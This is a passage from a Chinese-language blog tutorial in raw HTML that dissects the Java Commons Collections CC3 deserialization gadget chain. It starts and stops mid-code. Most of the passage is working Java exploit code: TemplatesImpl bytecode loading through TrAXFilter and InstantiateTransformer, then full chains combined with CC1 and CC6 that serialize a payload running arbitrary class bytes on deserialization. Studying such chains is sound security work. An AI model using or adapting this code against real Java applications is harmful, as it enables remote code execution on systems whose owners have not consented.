class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">TransletException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>OK，再次执行，正常调用执行字节码。<br />\n现在有了后半条链，如何进行拼接呢，使用 CC1 的就可以</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transforms <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"newTransformer\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">ChainedTransformer</span> chainedTransformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transforms<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        chainedTransformer<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>是不是非常熟悉了。</p>\n<h2 id=\"traxfilter\"><a class=\"anchor\" href=\"#traxfilter\">#</a> TrAXFilter</h2>\n<p>ysoserial 的作者并没有这样做，而是使用了 TrAXFilter 这个类，但是我们发现这个类是没有继承 Serializable 接口的，所以想要利用必须从 class 入手。</p>\n<blockquote>\n<p>TrAXFilter 源码</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">TrAXFilter</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Templates</span> templates<span class=\"token punctuation\">)</span>  <span class=\"token keyword\">throws</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">TransformerConfigurationException</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        _templates <span class=\"token operator\">=</span> templates<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        _transformer <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">TransformerImpl</span><span class=\"token punctuation\">)</span> templates<span class=\"token punctuation\">.</span><span class=\"token function\">newTransformer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        _transformerHandler <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerHandlerImpl</span><span class=\"token punctuation\">(</span>_transformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        _overrideDefaultParser <span class=\"token operator\">=</span> _transformer<span class=\"token punctuation\">.</span><span class=\"token function\">overrideDefaultParser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>只要调用构造函数就能够走到 newTransformer，所以反射调用。</p>\n<blockquote>\n<p>正常反射</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">TrAXFilter</span><span class=\"token punctuation\">></span></span> trAXFilterClass <span class=\"token operator\">=</span> <span class=\"token class-name\">TrAXFilter</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">Constructor</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">TrAXFilter</span><span class=\"token punctuation\">></span></span> constructor <span class=\"token operator\">=</span> trAXFilterClass<span class=\"token punctuation\">.</span><span class=\"token function\">getConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Templates</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        constructor<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>如果想要拼接 CC1 的链，我们还要改为 chainedTransformer 版本的</p>\n<blockquote>\n<p>chainedTransformer 版本</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transforms <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TrAXFilter</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getConstructor\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Templates</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"newInstance\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token class-name\">ChainedTransformer</span> chainedTransformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transforms<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        chainedTransformer<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"instantiatetransformer\"><a class=\"anchor\" href=\"#instantiatetransformer\">#</a> InstantiateTransformer</h2>\n<p>ysoserial 中使用到了一个 InstantiateTransformer 类，这个类就是去实例化一个类，所以可以代替 Transformer [] 的后两条。</p>\n<blockquote>\n<p>InstantiateTransformer 源码</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">InstantiateTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> paramTypes<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        iParamTypes <span class=\"token operator\">=</span> paramTypes<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        iArgs <span class=\"token operator\">=</span> args<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>input <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Class</span> <span class=\"token operator\">==</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FunctorException</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                    <span class=\"token string\">\"InstantiateTransformer: Input object was not an instanceof Class, it was a \"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                        <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>input <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">?</span> <span class=\"token string\">\"null object\"</span> <span class=\"token operator\">:</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token class-name\">Constructor</span> con <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">)</span> input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getConstructor</span><span class=\"token punctuation\">(</span>iParamTypes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">return</span> con<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span>iArgs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>加入 InstantiateTransformer</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transforms <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TrAXFilter</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InstantiateTransformer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Templates</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>templates<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">ChainedTransformer</span> chainedTransformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transforms<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        chainedTransformer<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"完整链\"><a class=\"anchor\" href=\"#完整链\">#</a> 完整链</h1>\n<blockquote>\n<p>拼接 CC1 （JDK 版本小于 8u71）</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span> templates <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TemplatesImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> templates<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取 Class</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\">// 对_name 进行复制</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">Field</span> name <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        name<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        name<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span><span class=\"token string\">\"aa\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token comment\">// 对_bytecodes 进行赋值</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> code <span class=\"token operator\">=</span> <span class=\"token class-name\">Files</span><span class=\"token punctuation\">.</span><span class=\"token function\">readAllBytes</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Paths</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/home/zhy/Desktop/Classes/Test.class\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">Field</span> bytecodes <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_bytecodes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        bytecodes<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        bytecodes<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span>bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\">// 对 _tfactory 进行赋值</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">Field</span> tfactory <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_tfactory\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        tfactory<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        tfactory<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerFactoryImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transforms <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TrAXFilter</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InstantiateTransformer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Templates</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>templates<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token class-name\">ChainedTransformer</span> chainedTransformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transforms<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">//        chainedTransformer.transform(1);</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> map <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        map<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"value\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> transformedMap <span class=\"token operator\">=</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> chainedTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> annotationInvocationHandler <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token class-name\">Constructor</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> declaredConstructor <span class=\"token operator\">=</span> annotationInvocationHandler<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        declaredConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token class-name\">Object</span> o <span class=\"token operator\">=</span> declaredConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Target</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span>transformedMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token class-name\">Ser</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token class-name\">UnSer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ser.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>拼接 CC6 （对 JDK 版本没有限制）</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span> templates <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TemplatesImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> templates<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取 Class</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\">// 对_name 进行复制</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">Field</span> name <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        name<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        name<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span><span class=\"token string\">\"aa\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token comment\">// 对_bytecodes 进行赋值</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> code <span class=\"token operator\">=</span> <span class=\"token class-name\">Files</span><span class=\"token punctuation\">.</span><span class=\"token function\">readAllBytes</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Paths</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/home/zhy/Desktop/Classes/Test.class\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">Field</span> bytecodes <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_bytecodes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        